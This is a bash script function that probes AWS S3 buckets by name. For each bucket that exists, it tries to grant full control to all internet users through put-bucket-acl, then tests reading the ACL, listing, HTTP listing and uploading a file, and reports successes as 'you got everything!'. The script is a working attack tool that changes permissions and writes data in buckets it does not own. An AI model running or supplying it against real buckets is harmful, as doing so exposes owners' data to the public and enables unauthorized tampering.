#!/bin/bash

function test() {
    bucket=$1
    #echo $bucket
    http=`curl -s http://$bucket.s3.amazonaws.com/`
    exist=`echo $http | egrep -i 'not supported|not exist|A client error|An error occurred' | wc -w`
    #ls=`aws s3 ls s3://$bucket 2>&1`
    #exist=`echo $ls |egrep -i "not supported|not exist" | wc -w`
    #echo $exist

    if [ -n "$http" ] && [ $exist -eq 0 ] ; then
	    _print $bucket GREEN
	echo

	putacl=`aws s3api put-bucket-acl --grant-full-control 'uri="http://acs.amazonaws.com/groups/global/AllUsers"' --bucket $bucket 2>&1`
	region=`echo $putacl |egrep -i "region|specified endpoint"`
	if [ -n "$region" ] ; then
	    _print "config region failed, " WHITE
	else
	    putacl=`echo $putacl |egrep -i "denied|disabled|not supported|not exist|has been disabled|A client error|An error occurred"`
	    if [ -n "$putacl" ] ; then
		_print "put ACL failed" DARK_GRAY
		_print ", "
	    else
		_print "put ACL success" RED
		_print ", you got everything!"
	    fi
	fi

	if [ -n "$putacl" ] ; then
	    if [ -n "$region" ] ; then
		_print "config region failed, " WHITE
	    else
  		getacl=`aws s3api get-bucket-acl --bucket $bucket 2>&1 |egrep -i "denied|disabled|not supported|not exist|has been disabled|A client error|An error occurred"`
		if [ -n "$getacl" ] ; then
		    _print "get ACL failed" DARK_GRAY
		else
		    _print "get ACL success" ORANGE
		fi
		_print ", "
	    fi
	fi
		
	if [ -n "$putacl" ] ; then
	    if [ -n "$region" ] ; then
		_print "config region failed, " WHITE
	    else
		ls=`aws s3 ls s3://$bucket 2>&1`
		read=`echo $ls |egrep -i "denied|disabled|not supported|not exist|has been disabled|A client error|An error occurred"`
		if [ -n "$read" ] ; then
		    _print "list failed" DARK_GRAY
		else
		    _print "list success" ORANGE
		fi
		_print ", "
	    fi
	fi
	
	if [ -n "$putacl" ] ; then
	    read=`echo $http |egrep -i "denied|disabled|not supported|not exist|has been disabled|A client error|An error occurred"`
	    if [ -n "$read" ] ; then
		_print "http list failed" DARK_GRAY
	    else
		_print "http list success" ORANGE
	    fi
	    _print ", "
	fi
	
	if [ -n "$putacl" ] ; then
	    if [ -n "$region" ] ; then
		_print "config region failed" WHITE
	    else
   		write=`aws s3 cp $f s3://$bucket 2>&1 |egrep -i "denied|disabled|not supported|not exist|has been disabled|A client error|An error occurred"`
		if [ -n "$write" ] ; then
		    _print "write failed" DARK_GRAY
		else
		    _print "write success" RED
		fi
	    fi
	fi
	
	echo
    fi
}
